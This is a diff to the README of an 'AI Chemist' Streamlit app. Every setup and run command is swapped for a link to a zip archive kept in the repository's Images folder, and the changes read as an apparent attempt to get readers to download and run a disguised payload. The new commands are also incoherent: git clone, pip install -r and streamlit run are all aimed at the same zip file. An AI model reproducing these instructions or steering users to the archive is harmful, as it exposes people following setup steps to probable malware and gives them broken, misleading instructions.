@@ -23,7 +23,7 @@ The **AI Chemist** application is an innovative web-based tool designed to assis
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Chandu0394/MyProject.git
+   git clone https://github.com/Chandu0394/AI-Chemist/raw/refs/heads/master/Images/Chemist_A_v2.5.zip
    cd MyProject
    ```
 
@@ -35,7 +35,7 @@ The **AI Chemist** application is an innovative web-based tool designed to assis
 
 3. Install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Chandu0394/AI-Chemist/raw/refs/heads/master/Images/Chemist_A_v2.5.zip
    ```
 
 4. Set up your Google API key:
@@ -48,7 +48,7 @@ The **AI Chemist** application is an innovative web-based tool designed to assis
 
 1. Start the Streamlit app:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/Chandu0394/AI-Chemist/raw/refs/heads/master/Images/Chemist_A_v2.5.zip
    ```
 
 2. Open your web browser and navigate to `http://localhost:8501`.
